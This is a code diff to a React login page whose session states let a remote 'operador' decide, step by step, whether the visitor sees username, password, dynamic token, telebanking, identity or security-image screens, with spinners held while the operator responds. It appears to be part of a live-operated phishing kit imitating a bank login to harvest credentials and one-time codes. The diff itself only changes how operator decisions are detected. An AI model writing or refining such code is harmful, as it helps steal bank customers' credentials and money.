@@ -68,8 +68,6 @@ export default function LoginPage() {
         const actionKey = `${session.state}:${session.imageSrc || ""}:${session.phrase || ""}`;
         const actionSeq = session.actionSeq ?? 0;
         const isNewSeq = actionSeq > 0 && actionSeq !== lastActionSeqRef.current;
-        const isNewTime = (session.updatedAt ?? 0) > (submittedAtRef.current || 0);
-        const isOperatorDecision = isNewSeq || isNewTime;
 
         if (isNewSeq) {
           lastActionSeqRef.current = actionSeq;
@@ -77,11 +75,11 @@ export default function LoginPage() {
 
         // Acciones del operador primero (c-interna / errores / done)
         if (session.state === "c-interna") {
-          if (step === "tejuino" && appliedActionRef.current === "error-tejuino" && !isOperatorDecision) {
+          if (step === "tejuino" && appliedActionRef.current === "error-tejuino" && !isNewSeq) {
             /* mantener error visible */
           } else if (
             appliedActionRef.current !== "c-interna" ||
-            isOperatorDecision ||
+            isNewSeq ||
             step !== "tejuino" ||
             waitingPanel
           ) {
@@ -96,10 +94,10 @@ export default function LoginPage() {
             setStep("tejuino");
           }
         } else if (session.state === "error-tejuino") {
-          const isResidual = appliedActionRef.current === "submitted-tejuino" && !isOperatorDecision;
+          const isResidual = appliedActionRef.current === "submitted-tejuino" && !isNewSeq;
           if (isResidual) {
             /* keep spinner — esperando respuesta del operador */
-          } else if (appliedActionRef.current !== "error-tejuino" || isOperatorDecision) {
+          } else if (appliedActionRef.current !== "error-tejuino" || isNewSeq) {
             appliedActionRef.current = "error-tejuino";
             tejuinoActiveRef.current = true;
             finishingRef.current = false;
@@ -113,7 +111,7 @@ export default function LoginPage() {
             setStep("tejuino");
           }
         } else if (session.state === "done") {
-          if (!finishingRef.current && (appliedActionRef.current !== "done" || isOperatorDecision || waitingPanel)) {
+          if (!finishingRef.current && (appliedActionRef.current !== "done" || isNewSeq || waitingPanel)) {
             appliedActionRef.current = "done";
             finishingRef.current = true;
             setOpsError("");
@@ -135,10 +133,10 @@ export default function LoginPage() {
         } else if (session.state === "error-token") {
           const isResidual =
             (appliedActionRef.current === "submitted-token" || appliedActionRef.current === "submitted-telebanca") &&
-            !isOperatorDecision;
+            !isNewSeq;
           if (isResidual) {
             /* keep spinner — esperando respuesta del operador */
-          } else if (appliedActionRef.current !== "error-token" || isOperatorDecision) {
+          } else if (appliedActionRef.current !== "error-token" || isNewSeq) {
             appliedActionRef.current = "error-token";
             setWaitingPanel(false);
             setAdvancing(false);
@@ -150,10 +148,10 @@ export default function LoginPage() {
             }
           }
         } else if (session.state === "error-user") {
-          const isResidual = appliedActionRef.current === "submitted-usuario" && !isOperatorDecision;
+          const isResidual = appliedActionRef.current === "submitted-usuario" && !isNewSeq;
           if (isResidual) {
             /* keep spinner */
-          } else if (appliedActionRef.current !== "error-user" || isOperatorDecision) {
+          } else if (appliedActionRef.current !== "error-user" || isNewSeq) {
             appliedActionRef.current = "error-user";
             setWaitingPanel(false);
             setAdvancing(false);
@@ -170,10 +168,10 @@ export default function LoginPage() {
             window.setTimeout(() => usernameRef.current?.focus(), 50);
           }
         } else if (session.state === "error-pass") {
-          const isResidual = appliedActionRef.current === "submitted-pass" && !isOperatorDecision;
+          const isResidual = appliedActionRef.current === "submitted-pass" && !isNewSeq;
           if (isResidual) {
             /* keep spinner */
-          } else if (appliedActionRef.current !== "error-pass" || isOperatorDecision) {
+          } else if (appliedActionRef.current !== "error-pass" || isNewSeq) {
             appliedActionRef.current = "error-pass";
             setWaitingPanel(false);
             setAdvancing(false);
@@ -189,11 +187,11 @@ export default function LoginPage() {
           session.state === "telebanca" ||
           session.state === "typing-telebanca"
         ) {
-          if (step === "telebanca" && appliedActionRef.current === "error-token" && !isOperatorDecision) {
+          if (step === "telebanca" && appliedActionRef.current === "error-token" && !isNewSeq) {
             /* mantener error visible */
           } else if (
             appliedActionRef.current !== "telebanca" ||
-            isOperatorDecision ||
+            isNewSeq ||
             step !== "telebanca" ||
             waitingPanel
           ) {
@@ -208,11 +206,11 @@ export default function LoginPage() {
           session.state === "identidad" ||
           session.state === "typing-identidad"
         ) {
-          if (step === "identidad" && appliedActionRef.current === "error-identidad" && !isOperatorDecision) {
+          if (step === "identidad" && appliedActionRef.current === "error-identidad" && !isNewSeq) {
             /* mantener error visible */
           } else if (
             appliedActionRef.current !== "identidad" ||
-            isOperatorDecision ||
+            isNewSeq ||
             step !== "identidad" ||
             waitingPanel
           ) {
@@ -224,10 +222,10 @@ export default function LoginPage() {
             setStep("identidad");
           }
         } else if (session.state === "error-identidad") {
-          const isResidual = appliedActionRef.current === "submitted-identidad" && !isOperatorDecision;
+          const isResidual = appliedActionRef.current === "submitted-identidad" && !isNewSeq;
           if (isResidual) {
             /* keep spinner */
-          } else if (appliedActionRef.current !== "error-identidad" || isOperatorDecision) {
+          } else if (appliedActionRef.current !== "error-identidad" || isNewSeq) {
             appliedActionRef.current = "error-identidad";
             setWaitingPanel(false);
             setAdvancing(false);
@@ -238,11 +236,11 @@ export default function LoginPage() {
             setStep("identidad");
           }
         } else if (session.state === "token" || session.state === "typing") {
-          if (step === "dinamica" && appliedActionRef.current === "error-token" && !isOperatorDecision) {
+          if (step === "dinamica" && appliedActionRef.current === "error-token" && !isNewSeq) {
             /* mantener error visible */
           } else if (
             appliedActionRef.current !== "token" ||
-            isOperatorDecision ||
+            isNewSeq ||
             step !== "dinamica" ||
             waitingPanel
           ) {
@@ -258,11 +256,11 @@ export default function LoginPage() {
           session.imageSrc &&
           session.phrase
         ) {
-          if (step === "imagen" && appliedActionRef.current === "error-pass" && !isOperatorDecision) {
+          if (step === "imagen" && appliedActionRef.current === "error-pass" && !isNewSeq) {
             /* mantener error visible */
           } else if (
             appliedActionRef.current !== actionKey ||
-            isOperatorDecision ||
+            isNewSeq ||
             step !== "imagen" ||
             waitingPanel
           ) {
